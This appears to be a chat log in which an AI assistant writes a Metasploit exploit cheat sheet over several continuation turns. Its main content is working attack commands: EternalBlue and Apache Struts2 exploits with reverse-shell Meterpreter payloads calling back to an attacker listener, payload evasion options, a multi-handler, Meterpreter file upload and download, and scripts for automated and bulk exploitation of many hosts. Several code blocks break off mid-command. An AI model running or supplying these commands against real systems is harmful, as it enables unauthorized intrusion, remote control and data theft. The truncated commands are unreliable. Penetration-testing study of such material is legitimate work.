
Metasploit **exploit modules** are pre-built scripts or payloads designed to take advantage of vulnerabilities in software, systems, or networks. These modules are part of the **Metasploit Framework (MSF)**, a penetration testing tool used for security assessments and ethical hacking.

### Key Features of Exploit Modules:
1. **Target-Specific Exploits** – They focus on known vulnerabilities in operating systems, applications, or services (e.g., EternalBlue for Windows SMB).
2. **Payload Delivery** – They often include or work with payloads (like reverse shells) to execute commands post-exploitation.
3. **Customization** – Users can configure options such as target IP, port, and exploit parameters.
4. **Integration with Auxiliary Modules** – Used alongside scanners, fuzzers, and post-exploitation tools.
5. **Automation** – Simplifies exploitation by handling complex attack chains.

### Example Commands:
```bash
use exploit/windows/smb/ms17_010_eternalblue  
set RHOSTS <target_IP>  
exploit  
```

Create a cheat sheet extensive for further ellaboration


# **Metasploit Exploit Modules Cheat Sheet**  

This cheat sheet provides an in-depth reference for using **Metasploit exploit modules**, including key commands, workflow, and advanced techniques.  

---

## **1. Understanding Exploit Modules**  
Exploit modules are scripts that leverage vulnerabilities to gain unauthorized access or execute arbitrary code.  

### **Types of Exploits**  
| Type | Description | Example Module |
|------|------------|----------------|
| **Remote Exploits** | Target vulnerabilities over a network | `exploit/multi/http/struts2_code_exec` |
| **Local Exploits** | Require prior access to the system (privilege escalation) | `exploit/linux/local/sudo_baron_samedit` |
| **Client-Side Exploits** | Target user applications (e.g., browsers, PDF readers) | `exploit/windows/fileformat/adobe_pdf_embedded_exe` |
| **Web App Exploits** | Attack web servers, CMS, APIs | `exploit/unix/webapp/wp_admin_shell_upload` |

---

## **2. Basic Workflow for Using Exploits**  

### **Step 1: Search for an Exploit**
```bash
search type:exploit <keyword>  # e.g., search type:exploit eternalblue
```

### **Step 2: Select & Load the Module**
```bash
use exploit/<path_to_module>   # e.g., use exploit/windows/smb/ms17_010_eternalblue
```

### **Step 3: Configure Required Options**
```bash
show options                  # View required settings
set RHOSTS <target_IP>       # Set target IP(s)
set RPORT <port>             # Set port if non-default
set PAYLOAD <payload_path>   # Optional: Override default payload (e.g., windows/x64/meterpreter/reverse_tcp)
```

### **Step 4: Run the Exploit**
```bash
exploit                      # Launch the exploit
run                          # Alternative command
```

---

## **3. Advanced Configuration & Techniques**

### **Payload Customization**
- List available payloads:
  ```bash
  show payloads  
  ```
- Set a custom payload:
  ```bash
  set PAYLOAD windows/meterpreter/reverse_tcp  
  set LHOST```

```bash
set LHOST <your_IP>          # Set listener IP (for reverse shells)
set LPORT <custom_port>      # Set listener port
```

### **Exploit Reliability & Evasion**
- Check exploit reliability:
  ```bash
  check                     # Test if target is vulnerable (not all modules support this)
  ```
- Evasion techniques:
  ```bash
  set EnableContextEncoding true   # Obfuscate payload  
  set DisablePayloadHandler true   # Skip automatic handler setup  
  ```

### **Multi-Handler for Payloads**
If payload execution is delayed, manually start a handler:
```bash
use exploit/multi/handler  
set PAYLOAD <matching_payload>  
set LHOST <your_IP>  
set LPORT <port>  
exploit -j                 # Run as a job
```

---

## **4. Post-Exploitation with Meterpreter**  

After successful exploitation (if using Meterpreter):  

| Command | Description |
|---------|-------------|
| `sysinfo` | View system information |
| `getuid` | Check current user privileges |
| `shell` | Drop into a system shell |
| `upload /local/file C:\\path` | Upload files to target |
| `download C:\\file.txt /tmp` | Download files from target |

---

## **5. Common Exploit Examples**  

### **EternalBlue (MS17-010)**
```bash
use exploit/windows/smb/ms17_010_eternalblue  
set RHOSTS 192.168.1.100  
set PAYLOAD windows/x64/meterpreter/reverse_tcp  
set LHOST 192.168.1.5  
exploit
```

### **Apache Struts2 RCE**
```bash
use exploit/multi/http/struts2_code_exec  
set RHOSTS vuln-server.com  
set TARGETURI /login.action  
set PAYLOAD linux/x86/shell_reverse_tcp  
exploit
```

---

## **6. Troubleshooting Exploits**  

- **"Exploit completed but no session"**: Verify payload compatibility (`show targets`).  
- **"Target not vulnerable"**: Double-check service
Continue from above append but dont start from begining

 Here’s the continuation of the **Metasploit Exploit Modules Cheat Sheet**, starting from where the previous section left off (Troubleshooting Exploits):

---

## **6. Troubleshooting Exploits** *(Continued)*  

- **"Exploit completed but no session"**:  
  - Verify payload compatibility (`show targets`).  
  - Ensure the listener (`LHOST/LPORT`) is reachable (firewall rules, NAT).  
  - Test with a generic payload (e.g., `cmd/unix/reverse` for Linux).  

- **"Target not vulnerable"**:  
  - Double-check service version (`info` module or manual verification).  
  - Try alternative targets (`show targets`, then `set TARGET <id>`).  

- **Crashing the Target Service**:  
  - Adjust exploit aggressiveness:  
    ```bash
    set VERBOSE true      # Debug output  
    set WfsDelay 10       # Add delay between attempts  
    ```

---

## **7. Exploit Module Management**  

### **Updating Metasploit**  
```bash
msfupdate       # Update framework and modules  
```

### **Using External Exploits**  
1. Save a `.rb` exploit script to:  
   ```bash
   ~/.msf4/modules/exploits/custom/  
   ```  
2. Reload modules:  
   ```bash
   reload_all    # Load new modules without restarting MSF  
   ```

---

## **8. Key msfconsole Commands for Exploits**  

| Command | Description | Example |
|---------|-------------|---------|
| `back` | Exit current module | `back` | 
| `info` | Show module details | `info exploit/multi/http/struts2_code_exec` | 
| `sessions -l` | List active sessions | `sessions -i 1` (interact with session 1) | 
| `jobs -K` | Kill all running jobs | `jobs -K` | 

---

## **9. Automation & Resource Scripts**  

### **Run Exploits via Resource Script**  
1. Create a file (`auto_exploit.rc`) with commands:  
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue  
   set RHOST```
Continue from above append but dont start from begining

 Here’s the continuation of the **Metasploit Exploit Modules Cheat Sheet**, focusing on automation and concluding with best practices:

---

## **9. Automation & Resource Scripts** *(Continued)*  

### **Run Exploits via Resource Script**  
1. Create a file (`auto_exploit.rc`) with commands:  
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue  
   set RHOSTS 192.168.1.100  
   set PAYLOAD windows/x64/meterpreter/reverse_tcp  
   set LHOST 192.168.1.5  
   exploit -j  
   ```  
2. Execute the script in `msfconsole`:  
   ```bash
   msfconsole -r auto_exploit.rc  
   ```

### **Bulk Exploitation with Host Lists**  
Use a loop to target multiple hosts:  
```bash
use exploit/windows/smb/ms17_010_eternalblue  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST 192.168
```